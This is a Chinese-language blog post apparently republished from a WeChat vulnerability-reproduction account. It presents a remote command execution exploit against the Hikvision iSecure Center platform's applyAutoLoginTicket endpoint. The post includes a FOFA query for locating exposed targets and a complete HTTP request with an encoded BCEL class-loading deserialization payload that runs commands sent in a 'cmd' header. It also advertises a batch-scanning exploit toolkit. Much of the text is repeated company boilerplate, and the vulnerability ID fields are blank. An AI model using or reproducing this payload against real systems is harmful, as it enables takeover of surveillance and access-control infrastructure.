#  Hikvision海康综合安防管理平台applyAutoLoginTicket接口存在远程命令执行漏洞 附POC   
南风徐来  南风漏洞复现文库   2024-06-20 23:35  
  
@[toc]  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
海康威视其产品包括摄像机、多屏控制器、交通产品、传输产品、存储产品、门禁产品、消防器材等。  
  
海康威视是以视频为核心的智能物联网解决方案和大数据服务提供商,业务聚焦于综合安防、大数据服务和智慧业务。  
## 1. Hikvision综合安防管理平台简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
海康威视其产品包括摄像机、多屏控制器、交通产品、传输产品、存储产品、门禁产品、消防器材等。  
  
海康威视是以  
视频为核心的智能物联网解决方案和大数据服务提供商,业务聚焦于综合安防、大数据服务和智慧业务。  
  
  
  
## 2.漏洞描述  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
海康威视其产品包括摄像机、多屏控制器、交通产品、传输产品、存储产品、门禁产品、消防器材等。  
海康威视  
是以视频为核心的智能物联网解决方案和大数据服务提供商,业务聚焦于综合安防、大数据服务和智慧业务。公司力图构建开放合作生态,为公共服务领域用户、企事业用户和中小企业用户提供服务  
  
Hikvision海康综合安防管理平台存在远程命令执行漏洞 附POC  
  
海康威视其产品包括摄像机、多屏控制器、交通产品、传输产品、存储产品、门禁产品、消防器材等。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
海康威视其产品包括摄像机、多屏控制器、交通产品、传输产品、存储产品、门禁产品、消防器材等。  
海康威视  
是以视频为核心的智能物联网解决方案和大数据服务提供商,业务聚焦于综合安防、大数据服务和智慧业务。公司力图构建开放合作生态,为公共服务领域用户、企事业用户和中小企业用户提供服务。  
海康威视  
通过不断发展智能物联技术,助力全球客户打造更安全、更便捷的社会生活环境。同时,我们时刻铭记与社会共享发展的责任,通过创新和协作的方式赋能  
  
HIKVISION iSecure Center综合安防管理平台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bib02EurqpY2mVMJAEJYzLQnpcb9rwdj5gjsDicROkKr83r0c3KFZIyh3SiatJ9ibKibZgqJ8t6M46grg/640?wx_fmt=jpeg&from=appmsg "null")  
  
Hikvision综合安防管理平台applyAutoLoginTicket接口存在远程命令执行漏洞  
## 4.fofa查询语句  
  
app="HIKVISION-综合安防管理平台" ||app="HIKVISION-iSecure-Center"  
## 5.漏洞复现  
  
  
海康威视其产品包括摄像机、多屏控制器、交通产品、传输产品、存储产品、门禁产品、消防器材等。  
  
海康威视  
是以视频为核心的智能物联网解决方案和大数据服务提供商,业务聚焦于综合安防、大数据服务和智慧业务。公司力图构建开放合作生态,为公共服务领域用户、企事业用户和中小企业用户提供服务。  
海康威视  
通过不断发展智能物联技术,助力全球客户打造更安全、更便捷的社会生活环境。同时,我们时刻铭记与社会共享发展的责任,通过创新和协作的方式赋能  
  
海康威视网络摄像机现已涵盖单摄到多摄的多种形态产品。具备全天候适应、全场景感知、全要素提取,  
  
漏洞链接：http://xx.xx.xx.xx/bic/ssoService/v1/applyAutoLoginTicket  
  
漏洞数据包：  
```
POST /bic/ssoService/v1/applyAutoLoginTicket HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Type: application/json
cmd: whoami
Content-Length: 3330

{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"}}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bib02EurqpY2mVMJAEJYzLQjM5VTfeY3AYYrNKRa81lsVZjUXAibnoCHcTuWpgQBuYQYibMrFy64mkg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bib02EurqpY2mVMJAEJYzLQY2WNBtIuYQKHpwicScK4MIegnSDodnjPuJnkeC1w02I6x9iaWxiabqGlQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bib02EurqpY2mVMJAEJYzLQibZia1nRMFh7icdcibo1UHuHMuicfpicB5xIDK0baiasFFgaTI6Zx4E5akatg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bib02EurqpY2mVMJAEJYzLQSOYGdQUYIC8F1ZX61UBfxc1onNeWaCRGnDcobtNjNGo6pXgaI2iciaVA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bib02EurqpY2mVMJAEJYzLQuLkGpvf1acgOJqCq9Sq4dNU2nv6WejH1iazPHINQ7d6WicOknouoC05A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bib02EurqpY2mVMJAEJYzLQQzibr9rdhJMReGHTdBvej6xNZkSSTmPayVWvu7PpXvic1bQlEZhAPu9Q/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
海康威视其产品包括摄像机、多屏控制器、交通产品、传输产品、存储产品、门禁产品、消防器材等。  
  
海康威视网络摄像机现已涵盖单摄到多摄的多种形态产品。具备全天候适应、全场景感知、全要素提取。  
海康威视  
是以视频为核心的智能物联网解决方案和大数据服务提供商,业务聚焦于综合安防、大数据服务和智慧业务。公司力图构建开放合作生态,为公共服务领域用户、企事业用户和中小企业用户提供服务  
  
  
请联系厂商寻找解决方案：https://www.hikvision.com/cn/  
## 8.往期回顾  
  
  
[CRMEB电商系统api/products存在SQL注入漏洞CVE-2024-36837 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486601&idx=1&sn=79ce1b6dfd0752f45c55a956f9965c1c&chksm=974b818ea03c08980d6e7c0174ff10031e8435644c3a3e1861de071ee999a7049c3e412cfd7c&scene=21#wechat_redirect)  
  
  
